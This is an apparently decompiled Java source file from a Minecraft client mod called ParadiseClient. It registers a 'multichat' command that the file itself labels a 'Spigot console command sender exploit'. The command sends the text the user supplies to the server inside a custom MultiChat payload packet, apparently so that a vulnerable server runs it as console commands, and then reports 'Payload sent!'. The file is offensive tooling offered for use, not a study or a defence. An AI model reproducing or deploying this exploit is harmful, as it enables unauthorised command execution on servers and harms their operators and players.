package io.github.spigotrce.paradiseclientprivate.command;

import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import io.github.spigotrce.paradiseclientfabric.Helper;
import io.github.spigotrce.paradiseclientfabric.command.Command;
import io.github.spigotrce.paradiseclientprivate.packets.MultiChatPayloadPacket;
import net.minecraft.class_2172;
import net.minecraft.class_2817;
import net.minecraft.class_310;

public class MultiChatCommand extends Command {
   public MultiChatCommand(class_310 minecraftClient) {
      super("multichat", "Spigot console command sender exploit", minecraftClient);
   }

   public LiteralArgumentBuilder<class_2172> build() {
      return (LiteralArgumentBuilder)((LiteralArgumentBuilder)literal(this.getName()).executes((context) -> {
         Helper.printChatMessage("Incomplete command!");
         return 1;
      })).then(argument("command", StringArgumentType.greedyString()).executes((context) -> {
         Helper.sendPacket(new class_2817(new MultiChatPayloadPacket((String)context.getArgument("command", String.class))));
         Helper.printChatMessage("Payload sent!");
         return 1;
      }));
   }
}
